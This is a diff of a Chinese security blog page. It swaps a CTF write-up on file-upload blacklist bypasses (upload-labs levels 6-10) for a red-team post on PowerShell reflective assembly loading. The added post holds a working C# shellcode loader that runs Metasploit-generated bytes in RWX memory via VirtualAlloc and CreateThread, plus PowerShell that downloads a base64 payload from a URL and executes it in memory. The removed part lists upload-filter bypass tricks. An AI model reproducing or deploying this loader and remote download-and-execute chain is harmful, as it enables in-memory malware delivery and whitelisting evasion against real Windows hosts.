@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>upload-master lvel 6 - level 10 | 九世的博客</title>
-  <meta name="keywords" content=" 靶场练习 ">
-  <meta name="description" content="upload-master lvel 6 - level 10 | 九世的博客">
+  <title>powershell Assembly Load的使用 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="powershell Assembly Load的使用 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1624,9 +1624,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-upload-master-lvel-6-level-10" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-powershell-Assembly-Load的使用" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">upload-master lvel 6 - level 10</h1>
+        <h1 class="article-title">powershell Assembly Load的使用</h1>
     
     <div class="article-meta">
         
@@ -1635,14 +1635,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">靶场练习</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-10-08 23:36:52">2019-10-08 23:14</time>
+        创建时间:<time class="date" title="更新时间: 2021-02-01 03:35:22">2021-02-01 03:19</time>
         
     </div>
     <div class="article-meta">
@@ -1664,7 +1664,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小序"><span class="toc-text">小序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解题"><span class="toc-text">解题</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1679,133 +1679,117 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="小序"><a href="#小序" class="headerlink" title="小序"></a>小序</h2><p>upload-master lvel 6 -level 10</p>
-<p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1570557971695&amp;di=53c5568d19a7105eed93886a85922950&amp;imgtype=0&amp;src=http%3A%2F%2Fn.sinaimg.cn%2Fsinacn17%2F87%2Fw1080h607%2F20180717%2Fc282-hfkffam4130126.jpg" alt=""></p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><strong>第6题</strong></p>
-<p>后端：黑名单的后端，黑名单很完善</p>
-<p>缺陷：没有过滤空格，导致可以在后缀后面加空格绕过判断</p>
-<pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
-        $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
-        $file_name = deldot($file_name);//删除文件名末尾的点
-        $file_ext = strrchr($file_name, &#39;.&#39;);
-        $file_ext = strtolower($file_ext); //转换为小写
-        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分析昨天的vbs的时候看见了个为<code>[Reflection.Assembly]::Load</code>的技术。好像没研究过<br>就拿来研究一下。</p>
+<p>简要说明：利用powershell进行C#里的函数调用</p>
+<p>参考链接：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</a></p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>注意实现，被调用的类名和函数名。须为public。且为静态(static)<br>test.cs</p>
+<pre><code class="c#">using System;
+using System.Runtime.InteropServices;
+namespace run
+{
+    public class Program
+    {
 
-        if (!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
-            if (move_uploaded_file($temp_file,$img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = &#39;上传出错！&#39;;
-            }
-        } else {
-            $msg = &#39;此文件不允许上传&#39;;
+        public static void box() {
+            byte[] shellcode = new byte[304]{
+                                    0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x8D, 0x45, 0xEC, 0xC7, 0x45, 0xEC, 0x75, 0x73, 0x65,
+                                    0x72, 0x33, 0xDB, 0xC7, 0x45, 0xF0, 0x33, 0x32, 0x2E, 0x64, 0x50, 0xB9, 0x4C, 0x77, 0x26, 0x07,
+                                    0x66, 0xC7, 0x45, 0xF4, 0x6C, 0x6C, 0x88, 0x5D, 0xF6, 0xC7, 0x45, 0xF8, 0x74, 0x6F, 0x70, 0x73,
+                                    0x66, 0xC7, 0x45, 0xFC, 0x65, 0x63, 0x88, 0x5D, 0xFE, 0xE8, 0x1A, 0x00, 0x00, 0x00, 0xFF, 0xD0,
+                                    0x53, 0x8D, 0x45, 0xF8, 0xB9, 0x45, 0x83, 0x56, 0x07, 0x50, 0x50, 0x53, 0xE8, 0x07, 0x00, 0x00,
+                                    0x00, 0xFF, 0xD0, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00,
+                                    0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9,
+                                    0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44,
+                                    0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74,
+                                    0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04,
+                                    0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8,
+                                    0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B,
+                                    0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33,
+                                    0xFF, 0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 0xC1, 0xCF,
+                                    0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24,
+                                    0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56,
+                                    0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83,
+                                    0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7,
+                                    0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB
+                                };
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0;
+            // prepare data
+            IntPtr pinfo = IntPtr.Zero;
+            // execute native code
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
-    } else {
-        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+        static void Main(string[] args)
+        {
+            // native function’s compiled code
+            // generated with metasploit
+
+        }
+        private static UInt32 MEM_COMMIT = 0x1000;
+        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern bool VirtualFree(IntPtr lpAddress,
+        UInt32 dwSize, UInt32 dwFreeType);
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern IntPtr CreateThread(
+        UInt32 lpThreadAttributes,
+        UInt32 dwStackSize,
+        UInt32 lpStartAddress,
+        IntPtr param,
+        UInt32 dwCreationFlags,
+        ref UInt32 lpThreadId
+        );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern bool CloseHandle(IntPtr handle);
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 WaitForSingleObject(
+        IntPtr hHandle,
+        UInt32 dwMilliseconds
+        );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern IntPtr GetModuleHandle(
+        string moduleName
+        );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 GetProcAddress(
+        IntPtr hModule,
+        string procName
+        );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 LoadLibrary(
+        string lpFileName
+        );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 GetLastError();
     }
 }
 </code></pre>
-<p><img src="https://s2.ax1x.com/2019/10/08/uhokc9.md.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/10/08/uhoQ9e.md.png" alt=""></p>
-<p><strong>第7题</strong></p>
-<p>后端：空格首尾删除补上了</p>
-<p>缺陷：由于.在windows上会自动删除，所以只要在后缀上加上.就可以绕过</p>
-<pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
-        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
-        $file_ext = strrchr($file_name, &#39;.&#39;);
-        $file_ext = strtolower($file_ext); //转换为小写
-        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
-        $file_ext = trim($file_ext); //首尾去空
-
-        if (!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = &#39;上传出错！&#39;;
-            }
-        } else {
-            $msg = &#39;此文件类型不允许上传！&#39;;
-        }
-    } else {
-        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
-    }
-}
+<p>利用csc生成或者vs生成 (这里csc生成对应的位数须为x86)</p>
+<pre><code>csc.exe /unsafe /platform:x86 /out:output\run.exe output\tmp.cs
+</code></pre><p>基本调用</p>
+<pre><code class="powershell">$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)
+[Reflection.Assembly]::Load($bytes)
+[run.Program]::box()
 </code></pre>
-<p><img src="https://s2.ax1x.com/2019/10/08/uhoR4U.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/10/08/uho4gJ.png" alt=""></p>
-<p><strong>第8题</strong></p>
-<p>后端：首尾去空，删除最后的.</p>
-<p>缺陷：把<code>::$DATA</code>忘记删了，windows上会自动删除<code>::$DATA</code></p>
-<p><img src="https://s2.ax1x.com/2019/10/08/uhTZvj.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/10/08/uhTMV0.png" alt=""></p>
-<p><strong>第9题</strong></p>
-<p>后端：这黑名单写的比较绝…</p>
-<p>缺陷：Apache或Nginx配置不当导致解析漏洞可造成此黑名单的死亡</p>
-<pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
-        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
-        $file_name = deldot($file_name);//删除文件名末尾的点
-        $file_ext = strrchr($file_name, &#39;.&#39;);
-        $file_ext = strtolower($file_ext); //转换为小写
-        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
-        $file_ext = trim($file_ext); //首尾去空
-
-        if (!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = &#39;上传出错！&#39;;
-            }
-        } else {
-            $msg = &#39;此文件类型不允许上传！&#39;;
-        }
-    } else {
-        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
-    }
-}
-</code></pre>
-<p><strong>第10题</strong></p>
-<p>后端：不管上传什么，删除后缀</p>
-<p>缺陷：双写绕过</p>
-<pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
-
-        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
-        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
-        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;        
-        if (move_uploaded_file($temp_file, $img_path)) {
-            $is_upload = true;
-        } else {
-            $msg = &#39;上传出错！&#39;;
-        }
-    } else {
-        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
-    }
-}
-</code></pre>
-<p><img src="https://s2.ax1x.com/2019/10/08/uh7pz4.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/10/08/uh7Adx.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/02/01/yVaJoT.png" alt=""></p>
+<p>下载并执行<br>远端的payload.txt</p>
+<pre><code>$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)
+$a=[Convert]::ToBase64String($bytes)
+$a | out-file &quot;payload.txt&quot;
+</code></pre><p>远程调用</p>
+<pre><code>$payload=(New-Object Net.WebClient).DownloadString(&quot;URL&quot;)
+$tk=[Convert]::FromBase64String($payload)
+[Reflection.Assembly]::Load($tk)
+[run.Program]::box()
+</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yVa0yR.png" alt=""></p>
+<p>写了个脚本用于快速生成对应的powershell command<br><a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1815,12 +1799,12 @@ if (isset($_POST[&#39;submit&#39;])) {
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>upload-master lvel 6 - level 10</p>
+    <p><span class="copy-title">文章标题:</span>powershell Assembly Load的使用</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-08, 23:14:41</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-08, 23:36:52</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/1860a963.html" title="upload-master lvel 6 - level 10">http://422926799.github.io/posts/1860a963.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-02-01, 03:19:38</p>
+    <p><span class="copy-title">最后更新:</span>2021-02-01, 03:35:22</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/7318adbf.html" title="powershell Assembly Load的使用">http://422926799.github.io/posts/7318adbf.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
